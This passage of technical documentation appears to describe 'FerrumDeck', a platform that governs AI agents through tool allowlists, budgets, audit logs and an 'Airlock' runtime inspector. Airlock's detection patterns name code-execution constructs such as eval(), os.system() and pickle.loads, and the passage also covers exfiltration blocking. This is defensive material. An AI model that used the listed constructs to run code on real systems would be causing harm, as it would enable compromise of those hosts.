Authorization: Bearer fd_live_xxxxx
```

**Response** (200):
```json
{
  "mode": "shadow",
  "rce": {
    "enabled": true
  },
  "velocity": {
    "enabled": true,
    "max_cost_cents": 100,
    "window_seconds": 10,
    "loop_threshold": 3
  },
  "exfiltration": {
    "enabled": true,
    "target_tools": ["http_get", "http_post"],
    "allowed_domains": ["api.github.com"],
    "block_ip_addresses": true
  }
}
```

### Update Airlock Mode

**Request**:
```http
PUT /v1/security/config
Content-Type: application/json
Authorization: Bearer fd_live_xxxxx

{
  "mode": "enforce"
}
```

**Response** (200):
```json
{
  "mode": "enforce",
  "previous_mode": "shadow",
  "updated_at": "2024-01-15T10:30:00Z"
}
```

---

# 8. Security Model

## Deny-by-Default Policy

**Every tool call is denied unless explicitly allowed.**

```yaml
# Tool Allowlist Configuration
allowlist:
  # Always allowed (read-only operations)
  allowed_tools:
    - get_file_contents
    - search_code
    - list_issues

  # Require human approval
  approval_required:
    - create_pull_request
    - push_files
    - create_issue

  # Explicitly blocked
  denied_tools:
    - delete_file
    - merge_pull_request
```

## Policy Evaluation Priority

1. **Denied** - Explicit deny rules (highest priority)
2. **Approval Required** - Needs human approval
3. **Allowed** - Explicitly permitted
4. **Default DENY** - Everything else is blocked

## Budget Enforcement

```yaml
budget:
  max_input_tokens: 100000    # 100k tokens
  max_output_tokens: 50000    # 50k tokens
  max_tool_calls: 50          # 50 tool invocations
  max_wall_time_ms: 300000    # 5 minutes
  max_cost_cents: 500         # $5.00
```

When any limit is exceeded, the run is immediately terminated with status `budget_killed`.

## Audit Trail

Every action is logged immutably:

```json
{
  "id": "aud_01HGXK...",
  "action": "tool.invoked",
  "actor_type": "agent",
  "actor_id": "run_01HGXK...",
  "resource_type": "tool",
  "resource_id": "create_pull_request",
  "details": {
    "args": "[REDACTED]",
    "result": "success"
  },
  "occurred_at": "2024-01-15T10:30:00Z"
}
```

## PII Redaction

Sensitive data is automatically redacted:
- API keys and tokens
- Passwords and secrets
- Email addresses
- Credit card numbers
- AWS credentials

## LLM Security Mitigations

### LLM01 (Prompt Injection)
- Input sanitization with pattern detection
- Risk scoring for suspicious inputs

### LLM02 (Insecure Output Handling)
- Output validation before tool execution
- Pattern detection for dangerous constructs

## Airlock RASP (Runtime Application Self-Protection)

Airlock is a multi-layer runtime security system that inspects every tool call before execution. It operates as a "virtual security guard" between the LLM and tool execution.

### Operating Modes

| Mode | Behavior | Use Case |
|------|----------|----------|
| **Shadow** (default) | Log violations but allow execution | Safe rollout, monitoring |
| **Enforce** | Block violations immediately | Production protection |

### Three Inspection Layers

```
Tool Call → [Layer 1: RCE Detection] → [Layer 2: Velocity Tracker] → [Layer 3: Exfiltration Shield] → Execute
                    ↓                          ↓                              ↓
               Block if pattern           Block if limit              Block if unauthorized
               matches dangerous           exceeded                    destination
               code patterns
```

#### Layer 1: Anti-RCE Pattern Detection
Detects dangerous code patterns in tool inputs:
- `eval()`, `exec()`, `compile()` calls
- `os.system()`, `subprocess.run()` shell execution
- Dynamic imports (`__import__`, `importlib`)
- Pickle deserialization (`pickle.loads`)
- Code objects (`code_type`, `types.CodeType`)

**Risk Score**: 90 (Critical)

#### Layer 2: Financial Circuit Breaker (Velocity Tracker)
Prevents runaway costs and infinite loops:
- **Spending velocity**: Max $1.00 per 10 seconds (configurable)
- **Loop detection**: Same tool+args called 3+ times triggers block

**Risk Scores**:
- Velocity breach: 85 (Critical)
- Loop detection: 75 (High)

#### Layer 3: Data Exfiltration Shield
Prevents unauthorized data transfer:
- Domain whitelist enforcement
- Raw IP address blocking
- URL pattern validation

**Risk Scores**:
- Exfiltration attempt: 80 (Critical)
- IP address used: 70 (High)

### Risk Scoring System

| Level | Score Range | Color | Action |
|-------|-------------|-------|--------|
| **Low** | 0-39 | Green | Log only |
| **Medium** | 40-59 | Yellow | Log + alert |
| **High** | 60-79 | Orange | Block in enforce mode |
| **Critical** | 80-100 | Red | Always block in enforce mode |

### Violation Types

| Type | Description | Default Risk |
|------|-------------|--------------|
| `rce_pattern` | Dangerous code pattern detected | 90 (Critical) |
| `velocity_breach` | Spending limit exceeded | 85 (Critical) |
| `loop_detection` | Infinite loop detected | 75 (High) |
| `exfiltration_attempt` | Unauthorized destination | 80 (Critical) |
| `ip_address_used` | Raw IP instead of domain | 70 (High) |

### Configuration

```yaml
# Airlock configuration
airlock:
  mode: shadow  # shadow (default) or enforce

  rce:
    enabled: true
    # Patterns are built-in and cannot be customized

  velocity:
    enabled: true
    max_cost_cents: 100      # $1.00 per window
    window_seconds: 10       # 10 second sliding window
    loop_threshold: 3        # Block after 3 identical calls

  exfiltration:
    enabled: true
    target_tools:            # Tools to inspect
      - http_get
      - http_post
      - fetch_url
    allowed_domains:         # Whitelist (empty = block all external)
      - api.github.com
      - api.anthropic.com
    block_ip_addresses: true # Block raw IPs
```

### Airlock API

```http
# Get current configuration
GET /v1/security/config

# Update mode (shadow/enforce)
PUT /v1/security/config
Content-Type: application/json

{
  "mode": "enforce"
}

# List detected threats
GET /v1/security/threats?risk_level=critical&limit=50

# Get specific threat details
GET /v1/security/threats/{threat_id}
```

### Integration with Runs

When Airlock detects a violation:
1. Threat record created with full context
2. Run's `threat_count` incremented
3. If enforce mode: tool call blocked, run may be terminated
4. If shadow mode: tool call proceeds, violation logged

---

# 9. Evaluation Framework

## Overview

The evaluation framework (`fd-evals`) provides:
- Deterministic agent testing
- Pluggable scorers
- Regression detection
- CI/CD integration

## Test Suites

```yaml
# evals/suites/smoke.yaml
name: smoke
description: Quick smoke tests for basic functionality

datasets:
  - path: datasets/safe-pr-agent
    filter:
      categories: [documentation]

scorers:
  - type: schema_valid
  - type: no_policy_violations

settings:
  timeout_ms: 60000
  max_parallel: 1
```

## Running Evals

```bash
# Smoke tests
make eval-run

# Full regression
make eval-run-full

# With mock mode (no control plane)
fd-eval run --suite smoke --mock

# Compare runs
fd-eval compare baseline.json current.json
```

## Built-in Scorers

| Scorer | Purpose |
|--------|---------|
| `schema_valid` | Output matches expected schema |
| `no_policy_violations` | No denied tool calls |
| `files_changed` | Correct files modified |
| `pr_created` | PR was created |
| `test_pass` | Tests pass after changes |
| `llm_judge` | LLM-as-judge evaluation |

## Creating Custom Scorers

```python
from fd_evals.scorer import Scorer, ScorerResult

class MyScorer(Scorer):
    name = "my_scorer"

    async def score(
        self,
        task_input: str,
        expected: dict,
        actual: str,
    ) -> ScorerResult:
        score = 1.0 if "expected" in actual else 0.0
        return ScorerResult(
            scorer_id=self.name,
            score=score,
            passed=score >= 0.8,
        )
```

---

# 10. Deployment Guide

## Prerequisites

- Docker and Docker Compose
- PostgreSQL 16+ (or pgvector image)
- Redis 7+
- Rust 1.80+ (for building)
- Python 3.12+ (for building)
- Node.js 20+ (for dashboard)

## Quick Start

```bash
# Clone repository
git clone https://github.com/org/ferrumdeck
cd ferrumdeck

# Start everything
make quickstart

# Open dashboard
make dashboard  # Opens http://localhost:3001
```

## Docker Compose

```yaml
# deploy/docker/compose.dev.yaml
services:
  postgres:
    image: pgvector/pgvector:pg16
    container_name: fd-postgres
    ports: ["5433:5432"]
    environment:
      POSTGRES_USER: ferrumdeck
      POSTGRES_PASSWORD: ferrumdeck
      POSTGRES_DB: ferrumdeck
    volumes:
      - postgres_data:/var/lib/postgresql/data

  redis:
    image: redis:7-alpine
    container_name: fd-redis
    ports: ["6379:6379"]

  gateway:
    build:
      context: ../..
      dockerfile: deploy/docker/Dockerfile.gateway
    container_name: fd-gateway
    ports: ["8080:8080"]
    environment:
      DATABASE_URL: postgres://ferrumdeck:ferrumdeck@postgres:5432/ferrumdeck
      REDIS_URL: redis://redis:6379

  dashboard:
    build:
      context: ../../nextjs
    container_name: fd-dashboard
    ports: ["3001:3000"]
    environment:
      GATEWAY_URL: http://gateway:8080

  worker:
    build:
      context: ../..
      dockerfile: deploy/docker/Dockerfile.worker
    container_name: fd-worker
    environment:
      CONTROL_PLANE_URL: http://gateway:8080
      ANTHROPIC_API_KEY: ${ANTHROPIC_API_KEY}
```

## Service Ports

| Service | Port | URL |
|---------|------|-----|
| Gateway | 8080 | http://localhost:8080 |
| Dashboard | 3001 | http://localhost:3001 |
| PostgreSQL | 5433 | localhost:5433 |
| Redis | 6379 | localhost:6379 |
| Jaeger UI | 16686 | http://localhost:16686 |
| OTEL Collector | 4317 | gRPC endpoint |

---

# 11. Configuration Reference

## Gateway Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `DATABASE_URL` | Required | PostgreSQL connection |
| `REDIS_URL` | `redis://localhost:6379` | Redis connection |
| `GATEWAY_PORT` | `8080` | HTTP port |
| `API_KEY_SECRET` | Dev default | HMAC secret for API keys |
| `ALLOWED_ORIGINS` | `localhost:3000,localhost:8000` | CORS origins |
| `RATE_LIMIT_PER_MINUTE` | `100` | API rate limit |
| `RUN_MIGRATIONS` | `true` | Auto-run migrations |
| `OTEL_EXPORTER_OTLP_ENDPOINT` | `http://localhost:4317` | OTel endpoint |

## Worker Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `REDIS_URL` | Required | Redis connection |
| `CONTROL_PLANE_URL` | Required | Gateway URL |
| `FD_API_KEY` | Required | API key for auth |
| `ANTHROPIC_API_KEY` | Required | Anthropic API key |
| `GITHUB_TOKEN` | Optional | GitHub PAT for MCP |
| `MCP_CONFIG_PATH` | Optional | MCP config file |
| `WORKER_MAX_RETRIES` | `3` | Max retry attempts |
| `WORKER_RETRY_DELAY_MS` | `1000` | Initial retry delay |
| `AGENTIC_MAX_ITERATIONS` | `25` | Max agentic loops |
| `SANDBOX_MODE` | `subprocess` | Sandbox mode |

## Dashboard Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `GATEWAY_URL` | `http://localhost:8080` | Gateway URL |
| `FD_API_KEY` | Required | API key |
| `NEXT_PUBLIC_POLL_INTERVAL` | `2000` | Polling interval ms |
| `DOCKER_LOGS_ENABLED` | `false` | Enable container logs |

## MCP Configuration

```json
// config/mcp-config.json
{
  "servers": [
    {
      "name": "github",
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"]
    }
  ],
  "allowlist": {
    "allowed_tools": ["get_file_contents", "search_code"],
    "approval_required": ["create_pull_request", "push_files"],
    "denied_tools": ["delete_file", "merge_pull_request"]
  }
}
```

---

# 12. Example Agents

## Safe PR Agent

The flagship agent that safely creates pull requests.

### Configuration

```yaml
# examples/safe-pr-agent/agent.yaml
name: safe-pr-agent
description: |
  Reads a repository, analyzes code, proposes changes,
  runs tests in sandbox, and creates a pull request.

system_prompt: |
  You are a helpful code assistant that creates pull requests.
  Guidelines:
  - Always read and understand existing code first
  - Write clean, well-documented code
  - Include tests for new functionality
  - Follow project coding conventions

default_model: claude-sonnet-4-20250514

allowed_tools:
  - read_file
  - list_files
  - search_code

approval_required_tools:
  - write_file
  - create_pr

budget:
  max_input_tokens: 50000
  max_output_tokens: 20000
  max_tool_calls: 30
  max_wall_time_ms: 180000  # 3 min
  max_cost_cents: 100       # $1
```

### Workflow

```yaml
# examples/safe-pr-agent/workflow.yaml
steps:
  - id: understand_task
    type: llm
    config:
      system_prompt: "Analyze the task and extract objectives..."

  - id: explore_repo
    type: tool
    depends_on: [understand_task]
    config:
      tool_name: list_directory

  - id: implement_changes
    type: loop
    depends_on: [analyze_code]
    config:
      max_iterations: 15

  - id: run_tests
    type: tool
    depends_on: [implement_changes]
    config:
      tool_name: run_tests

  - id: create_pull_request
    type: approval
    depends_on: [validate_changes]
    config:
      requires_approval: true
```

### Running the Agent

```bash
# Via CLI
fd run create \
  --agent safe-pr-agent \
  --input '{"task": "Add input validation to login form", "repo": "org/app"}'

# Via API
curl -X POST http://localhost:8080/v1/runs \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "safe-pr-agent", "input": {...}}'
```

---

# 13. Observability

## OpenTelemetry Integration

All components emit traces to the OTEL collector.

### GenAI Semantic Conventions

```python
# LLM call attributes
gen_ai.system = "anthropic"
gen_ai.request.model = "claude-sonnet-4-20250514"
gen_ai.usage.input_tokens = 1500
gen_ai.usage.output_tokens = 500
gen_ai.response.finish_reason = "stop"

# FerrumDeck attributes
ferrumdeck.run.id = "run_01HGXK..."
ferrumdeck.step.id = "stp_01HGXK..."
ferrumdeck.cost.cents = 25
```

### Jaeger UI

View distributed traces at http://localhost:16686

### Model Pricing

Pre-configured pricing for cost tracking:

| Model | Input $/1M | Output $/1M |
|-------|------------|-------------|
| claude-opus-4-20250514 | $15.00 | $75.00 |
| claude-sonnet-4-20250514 | $3.00 | $15.00 |
| claude-3-haiku | $0.25 | $1.25 |
| gpt-4o | $2.50 | $10.00 |
| gpt-4o-mini | $0.15 | $0.60 |

---

# 14. Development Guide

## Setup

```bash
# Install all dependencies
make install

# Start infrastructure
make dev-up

# Run gateway (in terminal 1)
make run-gateway

# Run worker (in terminal 2)
make run-worker

# Run dashboard (in terminal 3)
cd nextjs && npm run dev
```

## Code Quality

```bash
# Format all code
make fmt

# Lint all code
make lint

# Run all tests
make test

# Full CI check
make ci-check
```

## Database

```bash
# Run migrations
make db-migrate

# Reset database
make db-reset

# Seed with test data
make db-seed
```

## Testing

```bash
# Rust tests
make test-rust

# Python tests
make test-python

# Integration tests (requires dev-up)
make test-integration

# Evals
make eval-run
```

## Conventions

### Rust
- Edition: 2021 (MSRV 1.80)
- Async: Tokio runtime
- Errors: `thiserror` for library, `anyhow` for apps
- Format: `cargo fmt`
- Lint: `clippy --workspace -- -D warnings`

### Python
- Version: 3.12+
- Package manager: uv
- Format: ruff format (line-length 100)
- Lint: ruff check + pyright
- Test: pytest with asyncio_mode="auto"

### TypeScript
- Version: Next.js 16+ with React 19
- Style: Tailwind CSS 4
- Components: shadcn/ui
- State: TanStack Query
- Lint: ESLint with next config

### Naming
- Rust: snake_case files/functions, PascalCase types
- Python: snake_case throughout, PascalCase classes
- TypeScript: camelCase functions, PascalCase components
- Crate prefix: `fd-` (fd-core, fd-worker)
- Module prefix: `fd_` (fd_runtime)

---

# Appendix A: API Error Codes

| Code | HTTP | Description |
|------|------|-------------|
| `NOT_FOUND` | 404 | Resource not found |
| `BAD_REQUEST` | 400 | Invalid request |
| `VALIDATION_ERROR` | 422 | Validation failed |
| `UNAUTHORIZED` | 401 | Auth required |
| `FORBIDDEN` | 403 | Access denied |
| `POLICY_DENIED` | 403 | Policy blocked |
| `BUDGET_EXCEEDED` | 403 | Budget limit |
| `RATE_LIMITED` | 429 | Rate limit |
| `INTERNAL_ERROR` | 500 | Server error |

# Appendix B: Run Status States

| Status | Description | Terminal |
|--------|-------------|----------|
| `created` | Run created | No |
| `queued` | Waiting for worker | No |
| `running` | Executing | No |
| `waiting_approval` | Needs human approval | No |
| `completed` | Successfully finished | Yes |
| `failed` | Execution error | Yes |
| `cancelled` | User cancelled | Yes |
| `timeout` | Exceeded time limit | Yes |
| `budget_killed` | Exceeded budget | Yes |
| `policy_blocked` | Policy denied | Yes |

# Appendix C: Tool Risk Levels

| Level | Examples | Default Policy |
|-------|----------|----------------|
| `read` | get_file, search_code | Allowed |
| `write` | create_file, push_files | Approval required |
| `destructive` | delete_file, merge_pr | Denied |

---

*This documentation is auto-generated and maintained by the FerrumDeck team.*
